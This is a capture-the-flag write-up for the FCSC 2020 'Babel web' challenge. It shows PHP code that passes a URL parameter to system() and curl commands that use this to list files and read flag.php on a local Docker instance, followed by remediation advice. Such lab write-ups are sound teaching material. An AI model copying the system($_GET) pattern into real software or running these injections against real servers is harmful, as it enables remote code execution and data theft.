# Babel web

## Description

First, download docker-compose.yml:

```bash
curl https://hackropole.fr/challenges/fcsc2020-web-babel-web/docker-compose.public.yml -o docker-compose.yml
```

Launch the challenge by executing in the same folder:

```bash
docker compose up

```

Access the challenge at <http://localhost:8000/>.

## Findings

1. Visiting <http://localhost:8000/> displays a "Work in progress" page.

In the page source, we find the following commented HTML:

```html
<!-- <a href="?source=1">source</a> -->
```

1. Navigating to <http://localhost:8000/?source=1> reveals the source code of the PHP file:

```php
<?php
    if (isset($_GET['source'])) {
        @show_source(__FILE__);
    }  else if(isset($_GET['code'])) {
        print("<pre>");
        @system($_GET['code']);
        print("<pre>");
    } else {
?>
```

Here's what this code does:

- If the **\_GET['source']** parameter is set, it shows the source code of the current file.

- If the **\_GET['code']** parameter is set, it executes the command provided via the URL using system().

## Vulnerabilities

RCE : Remote Code Execution (RCE) on the `code` parameter. We can execute system command on the remote server.

## Explotation

Use the `code` parameter to list the files il the directory.

```bash
$ curl -G -d "code=ls" http://localhost:8000/
<pre>flag.php
index.php
<pre>⏎
```

Now, flag is accessible in flag.php, just cat the file.

```bash
curl -G -d "code=cat%20flag.php" http://localhost:8000/
```

## Remediations

1 . Remove the use of `@system();`. This a is a dangerous function, especially when the user can controll what it's executed. (you can secure by disabling theses function in php.ini)
2. Avoid `@show_source(__FILE__);`. This give all the buiness logic, potential vulnerabilities, to the attackers.
3. Avoid `@show_source(__FILE__);`. This give all the buiness logic, potential vulnerabilities, to the attackers.
